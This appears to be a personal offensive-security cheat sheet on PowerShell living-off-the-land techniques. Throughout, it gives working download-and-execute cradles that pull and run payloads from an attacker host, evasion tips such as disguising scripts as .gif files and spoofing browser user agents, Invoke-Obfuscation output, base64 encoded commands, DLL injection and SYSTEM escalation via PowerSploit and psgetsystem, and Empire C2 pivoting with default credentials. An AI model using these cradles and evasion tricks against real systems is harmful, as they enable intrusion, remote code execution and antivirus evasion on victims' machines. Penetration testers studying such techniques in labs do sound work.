> Living-of-the-land (using already existent tools of the operating system)

- Execute script from disk
- Preferred: Execute in memory  

GURU: https://github.com/danielbohannon

## Download & Execution

Methods (`Net.WebClient`) in memory
- `DownloadString`
- `DownloadData`
- etc.

### In Memory

Exhaustive in memory approach, with immediate execution (obviously):

```powershell
$downloader = New-Object System.net.webclient
$payload ="http://10.0.10.5:8000/pew.ps1"
$cmd = $downloader.DownloadString($payload)
# optional proxy creds
$proxy = [Net.WebRequest]::GetSystemWebProxy()
$proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
$downloader.Proxy = $proxy
# end optional proxy creds
Invoke-Expression $cmd
```

One-Liner:

```powershell
iex (New-Object Net.WebClient).DownloadString("http://10.0.10.5:8000/pew.ps1")
```

### On Disk

Methods on disk (check [LOLBAS](https://lolbas-project.github.io/#))

```powershell
$downloader = New-Object System.Net.WebClient
$payload = "http://attacker_URL/payload.exe"
$local_file = "C:\programdata\payload.exe"
$downloader.DownloadFile($payload,$local_file) 

& $local_file # executes the payload - you need the leading &
```

### Evasion

- Use https with cert if possible - this can avoid over-the-whire heuristics
- Also name your script `pew.gif` to avoid matching of extenstions, powershell will still execute the script!
- use custom header to resemble legit webrequest!  

```powershell
# ... use user-agent
$downloader.headers.add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36")
# ...
```

### execution of XML  

```xml
<?xml version="1.0"?>
	<command>
		<a>
			<execute>Get-Process</execute>
		</a>
	</command>
```

Load and execute in powershell  

```powershell
$xmldoc = New-Object System.Xml.XmlDocument
$xmldoc.Load("http://10.0.10.5:8000/pew.xml")
iex $xmldoc.command.a.execute
```

### usage of COM objects 

> What are COM-Objects: Intercomputer and -process communikation from objects 

```powershell
$downloader = New-Object –ComObject Msxml2.XMLHTTP
$downloader.open(“GET”, “http://10.0.10.5:8000/pew.gif”, $false)
$downloader.send()
iex $downloader.responseText
```

### Tools 

- [invoke-cradlecrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)

## Obfuscation  

- [invoke-obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)  

1. set scriptblock  

```powershell
# start invoke-obfuscation
invoke-obfuscation
> set scriptblock iex (New-Object Net.Webclient).downloadstring("http://10.0.10.5:8000/pew.ps1")
``` 

2. Choose option (string/encode etc.)  

```powershell
> string
> 3
# output:
. ( $PShoME[4]+$pshOmE[34]+'X') ([strInG]::joiN('', ([regEX]::MAtCHES(")''nIOJ-'x'+]3,1[)(GniRtSOT.ecNeReFErPEsobrEv$ ( & | )43]rahC[,'3me'ECalpeRc- )')3me1sp.w'+'e'+'p/0'+'0'+'08'+':5.0'+'1.0.01'+'//'+':ptth3me(g'+'ni'+'rtsd'+'aoln'+'wod.)'+'tneilc'+'be'+'W.teN '+'tcejbO-we'+'N( '+'x'+'ei'(( ", '.', 'RIG'+'HttOL'+'ef'+'T')|FoReACH{$_.Value}) ) )
```

3. Or encode  

```powershell
> encode
> 7
# output too long to display here
``` 

4. Avoid concatenating multiple steps connected to one option (like string)  

```powershell
> reset
```

5. Execution  

```powershell
cmd> powershell -Command "<encodedCommand>" # depending on ' and " may not work always
```

6. Launcher  

> Executing the payload a certain way  

```powershell
> launcher
> 3 # choose desired option
# copy payload and execute
```

**STUCK?** the `tutorial` command of `invoke-obfuscation` may help with the next steps.

### Encoded commands  

> Encoding of commands to avoid probable bad chars, depending on our circumstances 

1. Encode command  

```powershell
$cmd = 'ipconfig; arp'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$ec =[convert]::ToBase64String($bytes)
Write-Host $ec
aQBwAGMAbwBuAGYAaQBnADsAIABhAHIAcAA=
```

2. Execute via powershell  

```powershell
cmd> powershell.exe -encodedcommand aQBwAGMAbwBuAGYAaQBnADsAIABhAHIAcAA=
```

## IMPORTANT  

If tools are used, do not import them directly from source - moreover:
- use a download cradle to store in memory
- execute the scripts from memory  

altough the new windows AV might also mingle with that.

## post exploitation 

- [nishang](https://github.com/samratashok/nishang)
- [powersploit](https://github.com/PowerShellMafia/PowerSploit)
- [psgetsystem](https://github.com/decoder-it/psgetsystem)
  
nishang: download, import or serve the specific files to your victim

powersploit: same as above, different scripts and different features

--> Both will be skimmed if downloaded as zip to the victim by the antivirus! 

psgetsystem: try to get system via parent process

### examples  

- powersploit  

```powershell
# display notepad process
ps | ? {$_.processname -match "notepad"}  

# dll injection via powersploit
iex (New-Object net.webclient).DownloadString("http://10.0.10.5:8000/invoke-dllinjection.ps1");invoke-dllinjection -processid 5872 -DLL c:\programdata\cmd.dll
``` 

-> DLLinjection did not work...  

- psgetsystem
	- requires administrator powershell
	- used to circuvent whitelisted application restrictions
	- the command we execute is a child of the given process (via `id`) 

```powershell
# check potential system processes
get-process -includeusername | Where-Object {$_.username -match "SYSTEM"} | fl -Property Username,name,id 

# psgetsystem
. .\psgetsystem.ps1 # importing module
[MyProcess]::CreateProcessFromParent(1572,"cmd.exe", "")
```


## Empire

- C2 Framework [EMPIRE](https://github.com/BC-SECURITY/Empire) (Install manually - kali is fked up, installation takes 10-15 minutes)
	- Defaultcreds for *StarKiller*: `empireadmin:password123`

## Pivoting with empire
> The builtin socks proxy only forwards onto on target port...

1. Run the builtin webproxy within empire
2. Invoke the `powershell_management_invoke_socksproxy` and use attacker IP as `remote` system
3. execute
4. use `proxychains` for usage of the victim host